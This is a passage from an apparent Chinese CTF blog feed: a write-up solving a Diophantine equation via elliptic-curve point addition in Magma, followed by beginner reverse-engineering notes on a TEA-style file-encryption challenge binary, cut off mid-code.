class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// For my colleagues in Shell with a lot of love,  (and  with a lot of time now since no commuting, cause COVID) </span></span><br><span class="line"><span class="comment">// Code is commented to explain how to solve the meme  (https://preview.redd.it/p92108lekoq11.jpg?width=367&amp;format=pjpg&amp;auto=webp&amp;s=e0c84917c3d7e130cad06f9ab5a85634b0c88cfb) </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// x/(y+z) + y/(x+z) + z/(x+y) = 4 </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// This is the smallest solution: </span></span><br><span class="line"><span class="comment">// x=4373612677928697257861252602371390152816537558161613618621437993378423467772036 </span></span><br><span class="line"><span class="comment">// y=36875131794129999827197811565225474825492979968971970996283137471637224634055579 </span></span><br><span class="line"><span class="comment">// z=154476802108746166441951315019919837485664325669565431700026634898253202035277999 </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// Paste in the site below to execute this code see this result, also read the comments here to understand.  </span></span><br><span class="line"><span class="comment">// The last part of the prints() after executed shows you the solution above. </span></span><br><span class="line"><span class="comment">// http://magma.maths.usyd.edu.au/calc/ </span></span><br><span class="line"><span class="comment">// Eduardo Ruiz Duarte  </span></span><br><span class="line"><span class="comment">// toorandom@gmail.com </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// First we define our environment for our "problem" </span></span><br><span class="line"> </span><br><span class="line">R&lt;x,y,z&gt; := RationalFunctionField(Rationals(),<span class="number">3</span>); </span><br><span class="line"> </span><br><span class="line">problem := ((x/(y+z) + y/(x+z) + z/(x+y)) - <span class="number">4</span>) ; </span><br><span class="line"><span class="comment">// first note that we know a point after some computation (-1,4,11) that </span></span><br><span class="line"><span class="comment">// works but has a negative coordinate, the following function returns 0, which means that  </span></span><br><span class="line"><span class="comment">// (x/(y+z) + y/(x+z) + z/(x+y)) - 4 = 0    (just put the -4 in the other side) </span></span><br><span class="line">Evaluate(problem,[<span class="number">-1</span>,<span class="number">4</span>,<span class="number">11</span>]); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// after the previous returned 0 , we know the point fits, we continue. </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// we multiply by all the denominators of "problem" to get a polynomials </span></span><br><span class="line">problem*Denominator(problem); </span><br><span class="line"><span class="comment">// we obtain a polynomial without denominators x^3 - 3*x^2*y - 3*x^2*z - 3*x*y^2 - 5*x*y*z - 3*x*z^2 + y^3 - 3*y^2*z - 3*y*z^2 + z^3 </span></span><br><span class="line"><span class="comment">// We see is cubic, three variables, and every  term has the same degree (3) , therefore this is a cubic  </span></span><br><span class="line"><span class="comment">// homogeneous curve,  we know there is a point which is not the solution we want </span></span><br><span class="line"><span class="comment">// the point (-1,4,11) fits in the original "problem" so it should fit in this new curve without denominators too (since no denominator becomes 0) </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// We transform this equation to a "curve" in Projecive space of dimension 2 </span></span><br><span class="line">P2&lt;x,y,z&gt; := ProjectiveSpace(Rationals(),<span class="number">2</span>); </span><br><span class="line">C := Curve(P2,x^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">2</span>*y - <span class="number">3</span>*x^<span class="number">2</span>*z - <span class="number">3</span>*x*y^<span class="number">2</span> - <span class="number">5</span>*x*y*z - <span class="number">3</span>*x*z^<span class="number">2</span> + y^<span class="number">3</span> - <span class="number">3</span>*y^<span class="number">2</span>*z - <span class="number">3</span>*y*z^<span class="number">2</span> + z^<span class="number">3</span>); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// fit the point to the curve C (no error is returned) </span></span><br><span class="line">Pt := C![<span class="number">-1</span>,<span class="number">4</span>,<span class="number">11</span>]; </span><br><span class="line"> </span><br><span class="line"><span class="comment">// Since all cubic homogeneous curve with at least one point define an elliptc curve, we can transform  </span></span><br><span class="line"><span class="comment">// this curve C to an elliptc curve form and just like in cryptography, we will add this known point (mapped to the corresponded curve) </span></span><br><span class="line"><span class="comment">// with itself until we get only positive coordinates and go back to C (original Problem) </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Below, E is the curve, f is the map that maps   Points f:C -&gt; E  (C is our original curve without denominators, both curves C,E are equivalent  </span></span><br><span class="line"><span class="comment">// but in E we can "Add points" to get another point of E. </span></span><br><span class="line"><span class="comment">// and with f^-1 we can return to the point of C which is our original solution </span></span><br><span class="line"> </span><br><span class="line">E,f := EllipticCurve(C); </span><br><span class="line"> </span><br><span class="line"><span class="comment">//g is the inverse g:E-&gt;C  , f:C-&gt;E     so g(f([-1,4,11]))=[-1,4,11] </span></span><br><span class="line">g := f^<span class="number">-1</span>; </span><br><span class="line"> </span><br><span class="line"><span class="comment">// We try adding the known point Pt=[-1,4,11] mapped to E, 2..100 times </span></span><br><span class="line"><span class="comment">// to see if when mapped back the added point to C gives positive coordinates </span></span><br><span class="line"><span class="comment">//, this is 2*Pt, 3*Pt, ...., 100*Pt  and then mapping back to C all these. </span></span><br><span class="line"><span class="keyword">for</span> n:= <span class="number">1</span> to <span class="number">100</span> do </span><br><span class="line"> </span><br><span class="line"><span class="comment">// we calculate n times the point of C, known [-1,4,11] but mapped (via f) inside E (where we can do the "n times")  </span></span><br><span class="line">    nPt_inE:=n*f(Pt); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// we take this point on E back to C via f^-1  (which we renamed as g) </span></span><br><span class="line">    nPt_inC:=g(nPt_inE); </span><br><span class="line"> </span><br><span class="line"><span class="comment">//We obtain each coordinate of this point to see if is our positive solution, </span></span><br><span class="line"><span class="comment">// here MAGMA scales automatically the point such as Z is one always 1,  </span></span><br><span class="line"><span class="comment">// so it puts the same denominators in X,Y, so numerators of X,Y are our  </span></span><br><span class="line"><span class="comment">//solutions and denominator our Z,  think of  P=(a/c,b/c,1)   then c*P=(a,b,c) </span></span><br><span class="line">    X := Numerator(nPt_inC[<span class="number">1</span>]); </span><br><span class="line">    Y := Numerator(nPt_inC[<span class="number">2</span>]); </span><br><span class="line">    Z := Denominator(nPt_inC[<span class="number">1</span>]); </span><br><span class="line"> </span><br><span class="line">printf <span class="string">"X=%o\nY=%o\nZ=%o\n"</span>,X,Y,Z; </span><br><span class="line"> </span><br><span class="line"><span class="comment">// We check the condition for our original problem. </span></span><br><span class="line">  <span class="keyword">if</span> ((X gt <span class="number">0</span>) and (Y gt <span class="number">0</span>)) then </span><br><span class="line">       printf(<span class="string">"GOT IT!!! x=apple, y=banana, z=pineapple, check the above solution\n"</span>); </span><br><span class="line">     <span class="keyword">break</span>; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">     printf <span class="string">"Nee, some coordinate was negative above, I keep in the loop\n\n"</span>; </span><br><span class="line">  end <span class="keyword">if</span>; </span><br><span class="line"> </span><br><span class="line">end <span class="keyword">for</span>;    </span><br><span class="line"> </span><br><span class="line"><span class="comment">// We check the solution fits in the original problem </span></span><br><span class="line"><span class="keyword">if</span> Evaluate(problem, [X,Y,Z]) eq <span class="number">0</span> then </span><br><span class="line">    printf <span class="string">"I evaluated the point to the original problem and yes, it worked!\n"</span>; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    printf <span class="string">"Mmm this cannot happen!\n"</span>; </span><br><span class="line">end <span class="keyword">if</span>;</span><br></pre></td></tr></table></figure><p>注释就不删了，这样我也不用解释了，主要看到这两行</p><p><code>C := Curve(P2,x^3 - 3*x^2*y - 3*x^2*z - 3*x*y^2 - 5*x*y*z - 3*x*z^2 + y^3 - 3*y^2*z - 3*y*z^2 + z^3);</code></p><p><code>E,f := EllipticCurve(C);</code></p><p>这两行很关键啊，他把三次曲线映射到椭圆曲线后，还返回了f,这个f就是这个映射关系啊，那么这个问题就解决了啊。</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先我们生成一个满足要求的初始点，直接爆破就完事</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from fractions import Fraction as Frac</span><br><span class="line">from math import gcd</span><br><span class="line">n = 100</span><br><span class="line">for x in range(-n, n + 1):</span><br><span class="line">    for y in range(-n, n + 1):</span><br><span class="line">        for z in range(0, n + 1):</span><br><span class="line">            if gcd(x, gcd(y, z)) == 1:</span><br><span class="line">                if x**3 + y**3 + z**3 - 5 * x**2 * (y + z) - 5 * y**2 * (</span><br><span class="line">                        z + x) - 5 * z**2 * (x + y) - 9 * x * y * z == 0:</span><br><span class="line">                    print((x, y, z))</span><br><span class="line"></span><br><span class="line">(<span class="string">-23</span>, <span class="string">-7</span>, 3)</span><br><span class="line">(<span class="string">-8</span>, <span class="string">-7</span>, 5)</span><br><span class="line">(<span class="string">-7</span>, <span class="string">-23</span>, 3)</span><br><span class="line">(<span class="string">-7</span>, <span class="string">-8</span>, 5)</span><br><span class="line">(<span class="string">-5</span>, 7, 8)</span><br><span class="line">(<span class="string">-5</span>, 8, 7)</span><br><span class="line">(<span class="string">-3</span>, 7, 23)</span><br><span class="line">(<span class="string">-3</span>, 23, 7)</span><br><span class="line">(<span class="string">-1</span>, <span class="string">-1</span>, 1)</span><br><span class="line">(<span class="string">-1</span>, 0, 1)</span><br><span class="line">(<span class="string">-1</span>, 1, 0)</span><br><span class="line">(<span class="string">-1</span>, 1, 1)</span><br><span class="line">(0, <span class="string">-1</span>, 1)</span><br><span class="line">(1, <span class="string">-1</span>, 0)</span><br><span class="line">(1, <span class="string">-1</span>, 1)</span><br><span class="line">(7, <span class="string">-5</span>, 8)</span><br><span class="line">(7, <span class="string">-3</span>, 23)</span><br><span class="line">(8, <span class="string">-5</span>, 7)</span><br><span class="line">(23, <span class="string">-3</span>, 7)</span><br></pre></td></tr></table></figure><p>可以得到下面这么多点，但是有用的就俩(-23, -7, 3)、(-8, -7, 5)，其他要么不行，要么都是基于这俩的变形，导致结果只是数对里的值换个顺序。</p><p>然后我们去Magam跑这个代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">###Test</span><br><span class="line"><span class="comment">//R&lt;x,y,z&gt; := RationalFunctionField(Rationals(),3); </span></span><br><span class="line"><span class="comment">//problem := ((x/(y+z) + y/(x+z) + z/(x+y)) - 6) ; </span></span><br><span class="line"><span class="comment">//Evaluate(problem,[-23, -7, 3]); </span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">P2&lt;x,y,z&gt; := ProjectiveSpace(Rationals(),<span class="number">2</span>); </span><br><span class="line">C := Curve(P2,x^<span class="number">3</span> - <span class="number">5</span>*x^<span class="number">2</span>*y - <span class="number">5</span>*x^<span class="number">2</span>*z - <span class="number">5</span>*x*y^<span class="number">2</span> - <span class="number">9</span>*x*y*z - <span class="number">5</span>*x*z^<span class="number">2</span> + y^<span class="number">3</span> - <span class="number">5</span>*y^<span class="number">2</span>*z - <span class="number">5</span>*y*z^<span class="number">2</span> + z^<span class="number">3</span>); </span><br><span class="line">Pt := C![<span class="number">-23</span>, <span class="number">-7</span>, <span class="number">3</span>]; </span><br><span class="line">E,f := EllipticCurve(C); </span><br><span class="line">g := f^<span class="number">-1</span>; </span><br><span class="line"><span class="keyword">for</span> n:= <span class="number">1</span> to <span class="number">100</span> do  </span><br><span class="line">    nPt_inE:=n*f(Pt); </span><br><span class="line">    nPt_inC:=g(nPt_inE); </span><br><span class="line">    X := Numerator(nPt_inC[<span class="number">1</span>]); </span><br><span class="line">    Y := Numerator(nPt_inC[<span class="number">2</span>]); </span><br><span class="line">    Z := Denominator(nPt_inC[<span class="number">1</span>]); </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ((X gt <span class="number">0</span>) and (Y gt <span class="number">0</span>)) then </span><br><span class="line">       printf(<span class="string">"GOT IT!!! x=apple, y=banana, z=pineapple, check the above solution\n"</span>);</span><br><span class="line">       printf <span class="string">"n=%o\nX=%o\nY=%o\nZ=%o\n"</span>,n,X,Y,Z; </span><br><span class="line">  end <span class="keyword">if</span>; </span><br><span class="line"> </span><br><span class="line">end <span class="keyword">for</span>;</span><br><span class="line"></span><br><span class="line">###Test</span><br><span class="line"></span><br><span class="line"><span class="comment">//if Evaluate(problem, [X,Y,Z]) eq 0 then </span></span><br><span class="line">    <span class="comment">//printf "I evaluated the point to the original problem and yes, it worked!\n"; </span></span><br><span class="line"><span class="comment">//else </span></span><br><span class="line">    <span class="comment">//printf "Mmm this cannot happen!\n"; </span></span><br><span class="line"><span class="comment">//end if;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/04/crpNB12Kue86dMh.png" alt="image-20210404113904115"></p><p>这里最多迭代一百次，能够找到三个答案，因为我们有两个初始点，所以每个找三个，一共就六个了。或者也可以用一个初始点去迭代，就是越到后面的数就越大。</p><p>完了最后交互有个坑，就是因为数字太大了，手动交互数据接受的时候可能会被截断，这里得用一手pwntools。</p><h2 id="说在最后"><a href="#说在最后" class="headerlink" title="说在最后"></a>说在最后</h2><p>这题看着怎么也不像是能有个五六十队伍能做出来的啊。后来雪殇姐姐发来了一个<a href="https://ctftime.org/writeup/9637" target="_blank" rel="noopener">链接</a>，心态崩了，</p><p><img src="https://i.loli.net/2021/04/04/TmwhFsqobMSGcP2.png" alt="image-20210404114401556"></p><p><del>？？？？？我丢你妈的，原题，就尼玛离谱，合着我看了半天，，，，啥也不是，草。</del></p><p>这个做法估计也差不多，但是用的线好像不一样，所以映射关系也不一样，</p><p>应该是找到的这个<a href="https://mathoverflow.net/questions/227713/estimating-the-size-of-solutions-of-a-diophantine-equation/227722#comment562414_227760" target="_blank" rel="noopener">资料</a>里头评论区描述，这条线：$E’_n \colon y^2 = x \bigl(x^2 + (4n(n+3)-3)x + 32(n+3)\bigr)$</p><p>映射关系应该是：</p><p>$x = 4(n+3)(a+b+2c)/(c-(n+2)(a+b))$</p><p>$y = (8n^2+44n+60)(a-b)/(c-(n+2)(a+b))$</p><p>但怎么映射回去就不会了，手撸么？看评论区说这个映射关系 Magma 可以搞出来，估计 Magma也能搞回去，但俺也不会啊，有大佬教教么？不过这个脚本也给出关系了，</p><p>$a = \frac{8(N+3)-x+y}{2(N+3)(4-x)}$</p><p>$b = \frac{8(N+3)-x-y}{2(N+3)(4-x)}$</p><p>$c = \frac{-4(N+3)-(N+2)x}{(N+3)(4-X)}$</p><p>比赛完心态崩了，出去跑了两公里降了降血压。</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p>这道题比赛的时候已经没心情看了，晚上结束后才看的，好像也不是很难。</p><p>主要就是一个查找子串的算法。flag就是给出的一个字符串的子串，先出去了，晚上回来更叭可能。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向学习笔记 之 drinkSomeTea</title>
      <link href="/2021/03/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BdrinkSomeTea/"/>
      <url>/2021/03/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BdrinkSomeTea/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>​        这两天一直再看逆向相关的书，也在B站上看小甲鱼的视频学了一下OD(Ollydbg)，但一直还没有实际尝试过逆向的解题，今天刚好是DASCTF的march月赛，所以做了其中一道比较简单的逆向题来入了个门。</p><p>​        源程序在<a href="https://github.com/JayxV/Van1sh_Utility/blob/main/DASCTF-March/drinkSomeTea/drinkSomeTea.exe" target="_blank" rel="noopener">这里</a>，这里应该是有三个解法，首先我先介绍方法一</p><h3 id="method-1th"><a href="#method-1th" class="headerlink" title="method 1th"></a>method 1th</h3><p>首先用IDA载入，</p><p><img src="https://i.loli.net/2021/03/27/RwXMqNEu62GUknK.png" alt="image-1"></p><p>流程很简单，我们看到main（我按了一下反斜杠键，看着清爽些）</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">int</span> __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE <span class="built_in">v3</span><span class="comment">; // eax</span></span><br><span class="line">  void *<span class="built_in">v4</span><span class="comment">; // esi</span></span><br><span class="line">  int result<span class="comment">; // eax</span></span><br><span class="line">  DWORD <span class="built_in">v6</span><span class="comment">; // edi</span></span><br><span class="line">  char *<span class="built_in">v7</span><span class="comment">; // esi</span></span><br><span class="line">  DWORD <span class="built_in">v8</span><span class="comment">; // ebx</span></span><br><span class="line">  HANDLE v9<span class="comment">; // eax</span></span><br><span class="line">  void *v10<span class="comment">; // esi</span></span><br><span class="line">  DWORD NumberOfBytesRead<span class="comment">; // [esp+Ch] [ebp-8h] BYREF</span></span><br><span class="line">  DWORD NumberOfBytesWritten<span class="comment">; // [esp+10h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">sub_401000();</span></span><br><span class="line"><span class="keyword"> </span> <span class="keyword">sub_4013B2(aWelcomeToMyTea);</span></span><br><span class="line"><span class="keyword"> </span> <span class="built_in">v3</span> = CreateFileA(FileName, <span class="number">0xC0000000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>u, <span class="number">0x80</span>u, <span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">  <span class="built_in">v4</span> = <span class="built_in">v3</span><span class="comment">;</span></span><br><span class="line">  <span class="meta">if</span> ( <span class="built_in">v3</span> == -<span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">sub_4013B2(aIThinkYouDoNot);</span></span><br><span class="line"><span class="keyword"> </span>   result = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">v6</span> = GetFileSize(<span class="built_in">v3</span>, <span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">    <span class="meta">if</span> ( <span class="built_in">v6</span> &lt; <span class="number">0xEA60</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      SetFilePointer(<span class="built_in">v4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">      NumberOfBytesRead = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">      ReadFile(<span class="built_in">v4</span>, &amp;unk_409988, <span class="built_in">v6</span>, &amp;NumberOfBytesRead, <span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">      CloseHandle(<span class="built_in">v4</span>)<span class="comment">;</span></span><br><span class="line">      <span class="meta">if</span> ( <span class="built_in">v6</span> &gt;&gt; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">v7</span> = &amp;unk_409988<span class="comment">;</span></span><br><span class="line">        <span class="built_in">v8</span> = <span class="built_in">v6</span> &gt;&gt; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          (loc_4010A0)(<span class="built_in">v7</span>, &amp;unk_407030)<span class="comment">;</span></span><br><span class="line">          <span class="built_in">v7</span> += <span class="number">8</span><span class="comment">;</span></span><br><span class="line">          --<span class="built_in">v8</span><span class="comment">;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">while</span> ( <span class="built_in">v8</span> )<span class="comment">;</span></span><br><span class="line">      &#125;</span><br><span class="line">      v9 = CreateFileA(aTeaPngOut, <span class="number">0xC0000000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>u, <span class="number">0x80</span>u, <span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">      v10 = v9<span class="comment">;</span></span><br><span class="line">      <span class="meta">if</span> ( v9 == -<span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">sub_4013B2(aIThinkYouDoNot);</span></span><br><span class="line"><span class="keyword"> </span>     &#125;</span><br><span class="line">      <span class="meta">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        NumberOfBytesWritten = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">        WriteFile(v9, &amp;unk_409988, <span class="built_in">v6</span>, &amp;NumberOfBytesWritten, <span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">        CloseHandle(v10)<span class="comment">;</span></span><br><span class="line">        <span class="keyword">sub_4013B2(aNowThisCupOfTe);</span></span><br><span class="line"><span class="keyword"> </span>     &#125;</span><br><span class="line">      result = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">sub_4013B2(aYourTeaIsTooHo);</span></span><br><span class="line"><span class="keyword"> </span>     result = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑很简单：</p><p>首先读入一个文件tea.png【判断是否读入成功，否则退出】</p><p>获取文件大小【如果文件大于等于0xEA60字节，退出】</p><p>然后将文件大小除以8，作为循环躺数（以8字节为单位对文件内容进行加密）</p><p>【加密函数】（文件地址，&amp;unk_407030（<strong>key</strong>））</p><p>最后写入一个新的文件tea.png.out。</p><p>那我们就来看看这个加密函数</p><p><img src="https://i.loli.net/2021/03/27/xEJvBTD8pH1jwIR.png" alt="image-20210327194150988"></p><p>这里发现IDA反编译失败了，此时，要么就去啃汇编，要么就去找到原因</p><p>继续往下拉会发现<img src="https://i.loli.net/2021/03/27/RhA3mVzpcT68BEw.png" alt="image-20210327194236596"></p><p>这里有个神奇的指令，看不懂，据说是什么花指令（这个坑以后填叭），void教我的，在这里先按U（undefined），然后把00401116处 的值改为90（在hex-view里，F2，改掉，F2保存），也就是nop掉，</p><p>然后往上找push ebp【函数起点】，按p，创建函数</p><p><img src="https://i.loli.net/2021/03/27/NWLqrc18IdbvMog.png" alt="image-20210327195409251"></p><p>然后就可以快乐F5了</p><p><img src="https://i.loli.net/2021/03/27/us6Tky5gSFwevd4.png" alt="image-20210327195428766"></p><p>可以发现这个函数的两个参数，一个是int类型的指针（4字节），一个是_DWORD类型的指针（4字节）</p><p>并且在这里的操作中，我们可以看到，对第一个参数只用了a1[0],a1[1]这两个参数，对第二个参数，是用到了四个值</p><p>我们在思考一下这两个参数原本的意义，一个是8字节的文件，另一个是key，去看一下key</p><p><img src="https://i.loli.net/2021/03/27/1Bzqu8H4mTUcbea.png" alt="image-20210327194012170"></p><p>发现是个字符串，数一数是有16个字节的，所以估计是4个字节为一组作为一个_DWORD，那么第一个参数就是4个字符为一组作为一个int。然后在加密函数里进行操作。</p><p>那么字符怎么转换为数字呢？在.data块按d键就可以转化类型了，转化之后是</p><p><img src="https://i.loli.net/2021/03/27/4ySGpLUBqwXFb8T.png" alt="image-20210327195956419"></p><p>可以发现这个顺序怪怪的，是小端序，所以对于文件的数据而言，也是用的小端序了。</p><p>这里是对于前八字节的加密代码（我们能确定png文件的前八字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key[<span class="number">4</span>] = &#123; <span class="number">0x67616C66</span>, <span class="number">0x6b61667b</span>, <span class="number">0x6c665f65</span>, <span class="number">0x7d216761</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> v3 = <span class="number">0</span>; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line">    <span class="keyword">int</span> m[<span class="number">2</span>] = &#123; <span class="number">0x474e5089</span>, <span class="number">0x0a1a0a0d</span> &#125;; </span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v6 = m[<span class="number">1</span>];</span><br><span class="line">    v3 = m[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x %x %x\n"</span>, v5, v3, v6);</span><br><span class="line">        v5 -= <span 